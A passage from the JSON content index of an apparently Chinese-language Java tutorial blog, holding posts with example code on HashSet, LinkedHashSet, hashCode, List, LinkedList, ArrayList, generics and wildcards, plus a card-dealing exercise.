&#125;*/&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java_LinkedHashSet集合","slug":"java00176-LinkedHashSet集合","date":"2020-03-21T17:39:08.000Z","updated":"2020-03-21T17:40:21.083Z","comments":true,"path":"2020/03/22/java00176-LinkedHashSet集合/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/22/java00176-LinkedHashSet集合/","excerpt":"","text":"LinkedHashSet集合 123456789101112131415161718192021222324252627package com.itheima.demo02.Set;import java.util.HashSet;import java.util.LinkedHashSet;/* java.util.LinkedHashSet集合 extends HashSet集合 LinkedHashSet集合特点: 底层是一个哈希表(数组+链表/红黑树)+链表:多了一条链表(记录元素的存储顺序),保证元素有序 */public class Demo04LinkedHashSet &#123; public static void main(String[] args) &#123; HashSet&lt;String&gt; set = new HashSet&lt;&gt;(); set.add(\"www\"); set.add(\"abc\"); set.add(\"abc\"); set.add(\"itcast\"); System.out.println(set);//[abc, www, itcast] 无序,不允许重复 LinkedHashSet&lt;String&gt; linked = new LinkedHashSet&lt;&gt;(); linked.add(\"www\"); linked.add(\"abc\"); linked.add(\"abc\"); linked.add(\"itcast\"); System.out.println(linked);//[www, abc, itcast] 有序,不允许重复 &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java_HashSet存储自定义类型元素","slug":"java00175-HashSet存储自定义类型元素","date":"2020-03-21T17:33:26.000Z","updated":"2020-03-21T17:38:05.130Z","comments":true,"path":"2020/03/22/java00175-HashSet存储自定义类型元素/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/22/java00175-HashSet存储自定义类型元素/","excerpt":"","text":"HashSet存储自定义类型元素 1234567891011121314151617181920212223242526272829303132package com.itheima.demo02.Set;import java.util.HashSet;/* HashSet存储自定义类型元素 set集合报错元素唯一: 存储的元素(String,Integer,...Student,Person...),必须重写hashCode方法和equals方法 要求: 同名同年龄的人,视为同一个人,只能存储一次 */public class Demo03HashSetSavePerson &#123; public static void main(String[] args) &#123; //创建HashSet集合存储Person HashSet&lt;Person&gt; set = new HashSet&lt;&gt;(); Person p1 = new Person(\"小美女\",18); Person p2 = new Person(\"小美女\",18); Person p3 = new Person(\"小美女\",19); System.out.println(p1.hashCode());//1967205423 System.out.println(p2.hashCode());//42121758 System.out.println(p1==p2);//false System.out.println(p1.equals(p2));//false set.add(p1); set.add(p2); set.add(p3); System.out.println(set); &#125;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455package com.itheima.demo02.Set;import java.util.Objects;public class Person &#123; private String name; private int age; public Person() &#123; &#125; public Person(String name, int age) &#123; this.name = name; this.age = age; &#125; @Override public boolean equals(Object o) &#123; if (this == o) return true; if (o == null || getClass() != o.getClass()) return false; Person person = (Person) o; return age == person.age &amp;&amp; Objects.equals(name, person.name); &#125; @Override public int hashCode() &#123; return Objects.hash(name, age); &#125; @Override public String toString() &#123; return \"Person&#123;\" + \"name='\" + name + '\\'' + \", age=\" + age + '&#125;'; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public int getAge() &#123; return age; &#125; public void setAge(int age) &#123; this.age = age; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java_Set集合存储元素不重复的原理","slug":"java00174-Set集合存储元素不重复的原理","date":"2020-03-21T17:28:15.000Z","updated":"2020-03-21T17:29:47.228Z","comments":true,"path":"2020/03/22/java00174-Set集合存储元素不重复的原理/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/22/java00174-Set集合存储元素不重复的原理/","excerpt":"","text":"12345678910111213141516171819202122package com.itheima.demo02.Set;import java.util.HashSet;/* Set集合不允许存储重复元素的原理 */public class Demo02HashSetSaveString &#123; public static void main(String[] args) &#123; //创建HashSet集合对象 HashSet&lt;String&gt; set = new HashSet&lt;&gt;(); String s1 = new String(\"abc\"); String s2 = new String(\"abc\"); set.add(s1); set.add(s2); set.add(\"重地\"); set.add(\"通话\"); set.add(\"abc\"); System.out.println(set);//[重地, 通话, abc] &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java_哈希值","slug":"java00173-哈希值","date":"2020-03-21T17:14:47.000Z","updated":"2020-04-02T15:44:49.198Z","comments":true,"path":"2020/03/22/java00173-哈希值/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/22/java00173-哈希值/","excerpt":"","text":"什么是哈希表呢？ 在JDK1.8之前，哈希表底层采用数组+链表实现，即使用链表处理冲突，同一hash值的元素都存储在一个链表里。但是当位于一个桶中的元素较多，即hash值相等的元素较多时，通过key值依次查找的效率较低。而JDK1.8中，哈希表存储采用数组+链表+红黑树实现，当链表长度超过阈值（8）时，将链表转换为红黑树，这样大大减少了查找时间。 简单的来说，哈希表是由数组+链表+红黑树（JDK1.8增加了红黑树部分）实现的，如下图所示。 看到这张图就有人要问了，这个是怎么存储的呢？ 为了方便大家的理解我们结合一个存储流程图来说明一下： 总而言之，JDK1.8引入红黑树大程度优化了HashMap的性能，那么对于我们来讲保证HashSet集合元素的唯一，其实就是根据对象的hashCode和equals方法来决定的。如果我们往集合中存放自定义的对象，那么保证其唯一，就必须复写hashCode和equals方法建立属于当前对象的比较方式。 1234567891011121314151617181920212223242526272829303132333435363738394041package com.itheima.demo03.hashCode;/* 哈希值:是一个十进制的整数,由系统随机给出(就是对象的地址值,是一个逻辑地址,是模拟出来得到地址,不是数据实际存储的物理地址) 在Object类有一个方法,可以获取对象的哈希值 int hashCode() 返回该对象的哈希码值。 hashCode方法的源码: public native int hashCode(); native:代表该方法调用的是本地操作系统的方法 */public class Demo01HashCode &#123; public static void main(String[] args) &#123; //Person类继承了Object类,所以可以使用Object类的hashCode方法 Person p1 = new Person(); int h1 = p1.hashCode(); System.out.println(h1);//1967205423 | 1 Person p2 = new Person(); int h2 = p2.hashCode(); System.out.println(h2);//42121758 | 1 /* toString方法的源码: return getClass().getName() + \"@\" + Integer.toHexString(hashCode()); */ System.out.println(p1);//com.itheima.demo03.hashCode.Person@75412c2f System.out.println(p2);//com.itheima.demo03.hashCode.Person@282ba1e System.out.println(p1==p2);//false /* String类的哈希值 String类重写Obejct类的hashCode方法 */ String s1 = new String(\"abc\"); String s2 = new String(\"abc\"); System.out.println(s1.hashCode());//96354 System.out.println(s2.hashCode());//96354 System.out.println(\"重地\".hashCode());//1179395 System.out.println(\"通话\".hashCode());//1179395 &#125;&#125; 12345678910package com.itheima.demo03.hashCode;public class Person extends Object&#123; //重写hashCode方法 @Override public int hashCode() &#123; return 1; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java_HashSet集合介绍","slug":"java00172-HashSet集合介绍","date":"2020-03-21T17:12:33.000Z","updated":"2020-03-21T17:13:04.475Z","comments":true,"path":"2020/03/22/java00172-HashSet集合介绍/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/22/java00172-HashSet集合介绍/","excerpt":"","text":"HashSet集合介绍 java.util.HashSet是Set接口的一个实现类，它所存储的元素是不可重复的，并且元素都是无序的(即存取顺序不一致)。java.util.HashSet底层的实现其实是一个java.util.HashMap支持，由于我们暂时还未学习，先做了解。 HashSet是根据对象的哈希值来确定元素在集合中的存储位置，因此具有良好的存取和查找性能。保证元素唯一性的方式依赖于：hashCode与equals方法。 12","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java_LinkedList集合","slug":"java00171-LinkedList集合","date":"2020-03-21T16:28:37.000Z","updated":"2020-03-21T17:22:11.658Z","comments":true,"path":"2020/03/22/java00171-LinkedList集合/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/22/java00171-LinkedList集合/","excerpt":"","text":"java.util.LinkedList集合数据存储的结构是链表结构。方便元素添加、删除的集合。 LinkedList是一个双向链表，那么双向链表是什么样子的呢，我们用个图了解下 实际开发中对一个集合元素的添加与删除经常涉及到首尾操作，而LinkedList提供了大量首尾操作的方法。这些方法我们作为了解即可： public void addFirst(E e):将指定元素插入此列表的开头。 public void addLast(E e):将指定元素添加到此列表的结尾。 public E getFirst():返回此列表的第一个元素。 public E getLast():返回此列表的最后一个元素。 public E removeFirst():移除并返回此列表的第一个元素。 public E removeLast():移除并返回此列表的最后一个元素。 public E pop():从此列表所表示的堆栈处弹出一个元素。 public void push(E e):将元素推入此列表所表示的堆栈。 public boolean isEmpty()：如果列表不包含元素，则返回true。 public E remove(int index) 移除此列表中指定位置处的元素。将任何后续元素向左移（从索引中减 1）。返回从列表中删除的元素。 LinkedList是List的子类，List中的方法LinkedList都是可以使用。在开发时，LinkedList集合也可以作为堆栈，队列的结构使用。（了解即可） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899package com.itheima.demo01.List;import java.util.LinkedList;/* java.util.LinkedList集合 implements List接口 LinkedList集合的特点: 1.底层是一个链表结构:查询慢,增删快 2.里边包含了大量操作首尾元素的方法 注意:使用LinkedList集合特有的方法,不能使用多态 - public void addFirst(E e):将指定元素插入此列表的开头。 - public void addLast(E e):将指定元素添加到此列表的结尾。 - public void push(E e):将元素推入此列表所表示的堆栈。 - public E getFirst():返回此列表的第一个元素。 - public E getLast():返回此列表的最后一个元素。 - public E removeFirst():移除并返回此列表的第一个元素。 - public E removeLast():移除并返回此列表的最后一个元素。 - public E pop():从此列表所表示的堆栈处弹出一个元素。 - public boolean isEmpty()：如果列表不包含元素，则返回true。 */public class Demo02LinkedList &#123; public static void main(String[] args) &#123; show03(); &#125; /* - public E removeFirst():移除并返回此列表的第一个元素。 - public E removeLast():移除并返回此列表的最后一个元素。 - public E pop():从此列表所表示的堆栈处弹出一个元素。此方法相当于 removeFirst */ private static void show03() &#123; //创建LinkedList集合对象 LinkedList&lt;String&gt; linked = new LinkedList&lt;&gt;(); //使用add方法往集合中添加元素 linked.add(\"a\"); linked.add(\"b\"); linked.add(\"c\"); System.out.println(linked);//[a, b, c] //String first = linked.removeFirst(); String first = linked.pop(); System.out.println(\"被移除的第一个元素:\"+first); String last = linked.removeLast(); System.out.println(\"被移除的最后一个元素:\"+last); System.out.println(linked);//[b] &#125; /* - public E getFirst():返回此列表的第一个元素。 - public E getLast():返回此列表的最后一个元素。 */ private static void show02() &#123; //创建LinkedList集合对象 LinkedList&lt;String&gt; linked = new LinkedList&lt;&gt;(); //使用add方法往集合中添加元素 linked.add(\"a\"); linked.add(\"b\"); linked.add(\"c\"); //linked.clear();//清空集合中的元素 在获取集合中的元素会抛出NoSuchElementException //public boolean isEmpty()：如果列表不包含元素，则返回true。 if(!linked.isEmpty())&#123; String first = linked.getFirst(); System.out.println(first);//a String last = linked.getLast(); System.out.println(last);//c &#125; &#125; /* - public void addFirst(E e):将指定元素插入此列表的开头。 - public void addLast(E e):将指定元素添加到此列表的结尾。 - public void push(E e):将元素推入此列表所表示的堆栈。此方法等效于 addFirst(E)。 */ private static void show01() &#123; //创建LinkedList集合对象 LinkedList&lt;String&gt; linked = new LinkedList&lt;&gt;(); //使用add方法往集合中添加元素 linked.add(\"a\"); linked.add(\"b\"); linked.add(\"c\"); System.out.println(linked);//[a, b, c] //public void addFirst(E e):将指定元素插入此列表的开头。 //linked.addFirst(\"www\"); linked.push(\"www\"); System.out.println(linked);//[www, a, b, c] //public void addLast(E e):将指定元素添加到此列表的结尾。此方法等效于 add() linked.addLast(\"com\"); System.out.println(linked);//[www, a, b, c, com] &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java_ArrayList集合","slug":"java00170-ArrayList集合","date":"2020-03-21T16:21:14.000Z","updated":"2020-03-21T16:23:07.401Z","comments":true,"path":"2020/03/22/java00170-ArrayList集合/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/22/java00170-ArrayList集合/","excerpt":"","text":"ArrayList集合 java.util.ArrayList集合数据存储的结构是数组结构。元素增删慢，查找快，由于日常开发中使用最多的功能为查询数据、遍历数据，所以ArrayList是最常用的集合。 许多程序员开发时非常随意地使用ArrayList完成任何需求，并不严谨，这种用法是不提倡的。","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java_List集合介绍和常用方法","slug":"java00169-List集合介绍和常用方法","date":"2020-03-21T16:09:51.000Z","updated":"2020-03-21T16:11:24.330Z","comments":true,"path":"2020/03/22/java00169-List集合介绍和常用方法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/22/java00169-List集合介绍和常用方法/","excerpt":"","text":"java.util.List接口 extends Collection接口 List接口的特点: 1.有序的集合,存储元素和取出元素的顺序是一致的(存储123 取出123) 2.有索引,包含了一些带索引的方法 3.允许存储重复的元素 List接口中带索引的方法(特有) public void add(int index, E element): 将指定的元素，添加到该集合中的指定位置上。 public E get(int index):返回集合中指定位置的元素。 public E remove(int index): 移除列表中指定位置的元素, 返回的是被移除的元素。 public E set(int index, E element):用指定元素替换集合中指定位置的元素,返回值的更新前的元素。 注意: 操作索引的时候,一定要防止索引越界异常 IndexOutOfBoundsException:索引越界异常,集合会报 ArrayIndexOutOfBoundsException:数组索引越界异常 StringIndexOutOfBoundsException:字符串索引越界异常 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162package com.itheima.demo01.List;import java.util.ArrayList;import java.util.Iterator;import java.util.List;public class Demo01List &#123; public static void main(String[] args) &#123; //创建一个List集合对象,多态 List&lt;String&gt; list = new ArrayList&lt;&gt;(); //使用add方法往集合中添加元素 list.add(\"a\"); list.add(\"b\"); list.add(\"c\"); list.add(\"d\"); list.add(\"a\"); //打印集合 System.out.println(list);//[a, b, c, d, a] 不是地址重写了toString //public void add(int index, E element): 将指定的元素，添加到该集合中的指定位置上。 //在c和d之间添加一个itheima list.add(3,\"itheima\");//[a, b, c, itheima, d, a] System.out.println(list); //public E remove(int index): 移除列表中指定位置的元素, 返回的是被移除的元素。 //移除元素 String removeE = list.remove(2); System.out.println(\"被移除的元素:\"+removeE);//被移除的元素:c System.out.println(list);//[a, b, itheima, d, a] //public E set(int index, E element):用指定元素替换集合中指定位置的元素,返回值的更新前的元素。 //把最后一个a,替换为A String setE = list.set(4, \"A\"); System.out.println(\"被替换的元素:\"+setE);//被替换的元素:a System.out.println(list);//[a, b, itheima, d, A] //List集合遍历有3种方式 //使用普通的for循环 for(int i=0; i&lt;list.size(); i++)&#123; //public E get(int index):返回集合中指定位置的元素。 String s = list.get(i); System.out.println(s); &#125; System.out.println(\"-----------------\"); //使用迭代器 Iterator&lt;String&gt; it = list.iterator(); while(it.hasNext())&#123; String s = it.next(); System.out.println(s); &#125; System.out.println(\"-----------------\"); //使用增强for for (String s : list) &#123; System.out.println(s); &#125; String r = list.get(5);//IndexOutOfBoundsException: Index 5 out-of-bounds for length 5 System.out.println(r); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java数据结构_红黑树","slug":"java00168数据结构-红黑树","date":"2020-03-21T16:06:51.000Z","updated":"2020-03-21T16:07:20.394Z","comments":true,"path":"2020/03/22/java00168数据结构-红黑树/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/22/java00168数据结构-红黑树/","excerpt":"","text":"数据结构_红黑树","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java数据结构_链表","slug":"java00167数据结构-链表","date":"2020-03-21T15:31:33.000Z","updated":"2020-03-21T16:05:41.456Z","comments":true,"path":"2020/03/21/java00167数据结构-链表/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/21/java00167数据结构-链表/","excerpt":"","text":"数据结构_链表","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java数据结构_数组","slug":"java00166数据结构-数组","date":"2020-03-21T15:26:58.000Z","updated":"2020-03-21T15:28:17.701Z","comments":true,"path":"2020/03/21/java00166数据结构-数组/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/21/java00166数据结构-数组/","excerpt":"","text":"数组 数据结构","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java数据结构_队列","slug":"java00165数据结构-队列","date":"2020-03-21T15:23:40.000Z","updated":"2020-03-22T05:10:23.704Z","comments":true,"path":"2020/03/21/java00165数据结构-队列/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/21/java00165数据结构-队列/","excerpt":"","text":"队列数据结构","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java数据结构_栈","slug":"java00164数据结构-栈","date":"2020-03-21T15:18:15.000Z","updated":"2020-03-21T15:20:43.559Z","comments":true,"path":"2020/03/21/java00164数据结构-栈/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/21/java00164数据结构-栈/","excerpt":"","text":"栈数据结构","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"斗地主案例的需求分析和代码实现","slug":"java00163斗地主案例的需求分析和代码实现","date":"2020-03-16T03:49:07.000Z","updated":"2020-03-16T03:51:45.054Z","comments":true,"path":"2020/03/16/java00163斗地主案例的需求分析和代码实现/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/16/java00163斗地主案例的需求分析和代码实现/","excerpt":"","text":"斗地主案例的需求分析和代码实现 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283package com.itheima.demo04.Test;import java.util.ArrayList;import java.util.Collections;/* 斗地主综合案例: 1.准备牌 2.洗牌 3.发牌 4.看牌 */public class DouDiZhu &#123; public static void main(String[] args) &#123; //1.准备牌 //定义一个存储54张牌的ArrayList集合,泛型使用String ArrayList&lt;String&gt; poker = new ArrayList&lt;&gt;(); //定义两个数组,一个数组存储牌的花色,一个数组存储牌的序号 String[] colors = &#123;\"♠\",\"♥\",\"♣\",\"♦\"&#125;; String[] numbers = &#123;\"2\",\"A\",\"K\",\"Q\",\"J\",\"10\",\"9\",\"8\",\"7\",\"6\",\"5\",\"4\",\"3\"&#125;; //先把大王和小王存储到poker集合中 poker.add(\"大王\"); poker.add(\"小王\"); //循环嵌套遍历两个数组,组装52张牌 for(String number : numbers)&#123; for (String color : colors) &#123; //System.out.println(color+number); //把组装好的牌存储到poker集合中 poker.add(color+number); &#125; &#125; //System.out.println(poker); /* 2.洗牌 使用集合的工具类Collections中的方法 static void shuffle(List&lt;?&gt; list) 使用默认随机源对指定列表进行置换。 */ Collections.shuffle(poker); //System.out.println(poker); /* 3.发牌 */ //定义4个集合,存储玩家的牌和底牌 ArrayList&lt;String&gt; player01 = new ArrayList&lt;&gt;(); ArrayList&lt;String&gt; player02 = new ArrayList&lt;&gt;(); ArrayList&lt;String&gt; player03 = new ArrayList&lt;&gt;(); ArrayList&lt;String&gt; diPai = new ArrayList&lt;&gt;(); /* 遍历poker集合,获取每一张牌 使用poker集合的索引%3给3个玩家轮流发牌 剩余3张牌给底牌 注意: 先判断底牌(i&gt;=51),否则牌就发没了 */ for (int i = 0; i &lt; poker.size() ; i++) &#123; //获取每一张牌 String p = poker.get(i); //轮流发牌 if(i&gt;=51)&#123; //给底牌发牌 diPai.add(p); &#125;else if(i%3==0)&#123; //给玩家1发牌 player01.add(p); &#125;else if(i%3==1)&#123; //给玩家2发牌 player02.add(p); &#125;else if(i%3==2)&#123; //给玩家3发牌 player03.add(p); &#125; &#125; //4.看牌 System.out.println(\"刘德华:\"+player01); System.out.println(\"周润发:\"+player02); System.out.println(\"周星驰:\"+player03); System.out.println(\"底牌:\"+diPai); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java泛型通配符","slug":"java00162泛型通配符","date":"2020-03-16T03:38:57.000Z","updated":"2020-03-28T05:33:16.739Z","comments":true,"path":"2020/03/16/java00162泛型通配符/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/16/java00162泛型通配符/","excerpt":"","text":"java泛型通配符 当使用泛型类或者接口时，传递的数据中，泛型类型不确定，可以通过通配符&lt;?&gt;表示。但是一旦使用泛型的通配符后，只能使用Object类中的共性方法，集合中元素自身方法无法使用。 通配符基本使用 泛型的通配符:不知道使用什么类型来接收的时候,此时可以使用?,?表示未知通配符。 此时只能接受数据,不能往该集合中存储数据。 泛型的通配符: ?:代表任意的数据类型 使用方式: 不能创建对象使用 只能作为方法的参数使用 泛型的上限： 格式：类型名称 &lt;? extends 类 &gt; 对象名称 意义： 只能接收该类型及其子类 泛型的下限： 格式： 类型名称 &lt;? super 类 &gt; 对象名称 意义： 只能接收该类型及其父类型 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647package com.itheima.demo03.Generic;import java.util.ArrayList;import java.util.Iterator;public class Demo05Generic &#123; public static void main(String[] args) &#123; ArrayList&lt;Integer&gt; list01 = new ArrayList&lt;&gt;(); list01.add(1); list01.add(2); ArrayList&lt;String&gt; list02 = new ArrayList&lt;&gt;(); list02.add(\"a\"); list02.add(\"b\"); printArray(list01); printArray(list02); //ArrayList&lt;?&gt; list03 = new ArrayList&lt;?&gt;(); &#125; /* 定义一个方法,能遍历所有类型的ArrayList集合 这时候我们不知道ArrayList集合使用什么数据类型,可以泛型的通配符?来接收数据类型 注意: 泛型没有继承概念的 //报错 public static void printArray(ArrayList&lt;Object&gt; list)&#123; &#125; */ //如果尖括号中写Integer,printArray(list02);会报错 //如果尖括号中写String,printArray(list01);会报错 //所有我们使用泛型通配符 public static void printArray(ArrayList&lt;?&gt; list)&#123; //使用迭代器遍历集合 Iterator&lt;?&gt; it = list.iterator(); while(it.hasNext())&#123; //it.next()方法,取出的元素是Object,可以接收任意的数据类型 Object o = it.next(); System.out.println(o); &#125; &#125;&#125; 1234567891011121314151617181920212223242526272829303132333435363738package com.itheima.demo03.Generic;import java.util.ArrayList;import java.util.Collection;/* 泛型的上限限定: ? extends E 代表使用的泛型只能是E类型的子类/本身 泛型的下限限定: ? super E 代表使用的泛型只能是E类型的父类/本身 */public class Demo06Generic &#123; public static void main(String[] args) &#123; Collection&lt;Integer&gt; list1 = new ArrayList&lt;Integer&gt;(); Collection&lt;String&gt; list2 = new ArrayList&lt;String&gt;(); Collection&lt;Number&gt; list3 = new ArrayList&lt;Number&gt;(); Collection&lt;Object&gt; list4 = new ArrayList&lt;Object&gt;(); getElement1(list1); //getElement1(list2);//报错 getElement1(list3); //getElement1(list4);//报错 //getElement2(list1);//报错 //getElement2(list2);//报错 getElement2(list3); getElement2(list4); /* 类与类之间的继承关系 Integer extends Number extends Object String extends Object */ &#125; // 泛型的上限：此时的泛型?，必须是Number类型或者Number类型的子类 public static void getElement1(Collection&lt;? extends Number&gt; coll)&#123;&#125; // 泛型的下限：此时的泛型?，必须是Number类型或者Number类型的父类 public static void getElement2(Collection&lt;? super Number&gt; coll)&#123;&#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java定义和使用含有泛型的接口","slug":"java00161定义和使用含有泛型的接口","date":"2020-03-16T03:30:48.000Z","updated":"2020-03-16T03:36:58.757Z","comments":true,"path":"2020/03/16/java00161定义和使用含有泛型的接口/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/16/java00161定义和使用含有泛型的接口/","excerpt":"","text":"java定义和使用含有泛型的接口 定义格式： 12修饰符 interface 接口名&lt;代表泛型的变量&gt; &#123; &#125; 123456789101112131415161718package com.itheima.demo03.Generic;/* 测试含有泛型的接口 */public class Demo04GenericInterface &#123; public static void main(String[] args) &#123; //创建GenericInterfaceImpl1对象 GenericInterfaceImpl1 gi1 = new GenericInterfaceImpl1(); gi1.method(\"字符串\"); //创建GenericInterfaceImpl2对象 GenericInterfaceImpl2&lt;Integer&gt; gi2 = new GenericInterfaceImpl2&lt;&gt;(); gi2.method(10); GenericInterfaceImpl2&lt;Double&gt; gi3 = new GenericInterfaceImpl2&lt;&gt;(); gi3.method(8.8); &#125;&#125; 1234567891011121314151617package com.itheima.demo03.Generic;/* 含有泛型的接口,第一种使用方式:定义接口的实现类,实现接口,指定接口的泛型 public interface Iterator&lt;E&gt; &#123; E next(); &#125; Scanner类实现了Iterator接口,并指定接口的泛型为String,所以重写的next方法泛型默认就是String public final class Scanner implements Iterator&lt;String&gt;&#123; public String next() &#123;&#125; &#125; */public class GenericInterfaceImpl1 implements GenericInterface&lt;String&gt;&#123; @Override public void method(String s) &#123; System.out.println(s); &#125;&#125; 1234567package com.itheima.demo03.Generic;/* 定义含有泛型的接口 */public interface GenericInterface&lt;I&gt; &#123; public abstract void method(I i);&#125; 1234567891011121314151617181920package com.itheima.demo03.Generic;/* 含有泛型的接口第二种使用方式:接口使用什么泛型,实现类就使用什么泛型,类跟着接口走 就相当于定义了一个含有泛型的类,创建对象的时候确定泛型的类型 public interface List&lt;E&gt;&#123; boolean add(E e); E get(int index); &#125; public class ArrayList&lt;E&gt; implements List&lt;E&gt;&#123; public boolean add(E e) &#123;&#125; public E get(int index) &#123;&#125; &#125; */public class GenericInterfaceImpl2&lt;I&gt; implements GenericInterface&lt;I&gt; &#123; @Override public void method(I i) &#123; System.out.println(i); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java定义和使用含有泛型的方法","slug":"java00160定义和使用含有泛型的方法","date":"2020-03-16T03:24:53.000Z","updated":"2020-03-16T03:37:09.101Z","comments":true,"path":"2020/03/16/java00160定义和使用含有泛型的方法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/16/java00160定义和使用含有泛型的方法/","excerpt":"","text":"java定义和使用含有泛型的方法 定义含有泛型的方法: 泛型定义在方法的修饰符和返回值类型之间 格式: 123修饰符 &lt;泛型&gt; 返回值类型 方法名(参数列表(使用泛型))&#123;方法体;&#125; 含有泛型的方法,在调用方法的时候确定泛型的数据类型 传递什么类型的参数,泛型就是什么类型 12345678910111213141516171819202122232425package com.itheima.demo03.Generic;/* 测试含有泛型的方法 */public class Demo03GenericMethod &#123; public static void main(String[] args) &#123; //创建GenericMethod对象 GenericMethod gm = new GenericMethod(); /* 调用含有泛型的方法method01 传递什么类型,泛型就是什么类型 */ gm.method01(10); gm.method01(\"abc\"); gm.method01(8.8); gm.method01(true); gm.method02(\"静态方法,不建议创建对象使用\"); //静态方法,通过类名.方法名(参数)可以直接使用 GenericMethod.method02(\"静态方法\"); GenericMethod.method02(1); &#125;&#125; 12345678910111213package com.itheima.demo03.Generic;public class GenericMethod &#123; //定义一个含有泛型的方法 public &lt;M&gt; void method01(M m)&#123; System.out.println(m); &#125; //定义一个含有泛型的静态方法 public static &lt;S&gt; void method02(S s)&#123; System.out.println(s); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java定义和使用含有泛型的类","slug":"java00159定义和使用含有泛型的类","date":"2020-03-16T03:17:49.000Z","updated":"2020-03-21T15:07:08.567Z","comments":true,"path":"2020/03/16/java00159定义和使用含有泛型的类/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/16/java00159定义和使用含有泛型的类/","excerpt":"","text":"java定义和使用含有泛型的类 定义一个含有泛型的类,模拟ArrayList集合 泛型是一个未知的数据类型,当我们不确定什么什么数据类型的时候,可以使用泛型 泛型可以接收任意的数据类型,可以使用Integer,String,Student… 创建对象的时候确定泛型的数据类型 定义格式： 123修饰符 class 类名&lt;代表泛型的变量&gt;&#123; &#125; 1234567891011121314151617181920212223package com.itheima.demo03.Generic;public class Demo02GenericClass &#123; public static void main(String[] args) &#123; //不写泛型默认为Object类型 GenericClass gc = new GenericClass(); gc.setName(\"只能是字符串\"); Object obj = gc.getName(); //创建GenericClass对象,泛型使用Integer类型 GenericClass&lt;Integer&gt; gc2 = new GenericClass&lt;&gt;(); gc2.setName(1); Integer name = gc2.getName(); System.out.println(name); //创建GenericClass对象,泛型使用String类型 GenericClass&lt;String&gt; gc3 = new GenericClass&lt;&gt;(); gc3.setName(\"小明\"); String name1 = gc3.getName(); System.out.println(name1); &#125;&#125; 12345678910111213package com.itheima.demo03.Generic;public class GenericClass&lt;E&gt; &#123; private E name; public E getName() &#123; return name; &#125; public void setName(E name) &#123; this.name = name; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java使用泛型的好处","slug":"java00158使用泛型的好处","date":"2020-03-16T03:09:52.000Z","updated":"2020-03-16T03:16:18.699Z","comments":true,"path":"2020/03/16/java00158使用泛型的好处/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/16/java00158使用泛型的好处/","excerpt":"","text":"java使用泛型的好处 创建集合对象,使用泛型 好处: 避免了类型转换的麻烦,存储的是什么类型,取出的就是什么类型 把运行期异常(代码运行之后会抛出的异常),提升到了编译期(写代码的时候会报错) 弊端: 泛型是什么类型,只能存储什么类型的数据 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253package com.itheima.demo03.Generic;import java.util.ArrayList;import java.util.Iterator;public class Demo01Generic &#123; public static void main(String[] args) &#123; 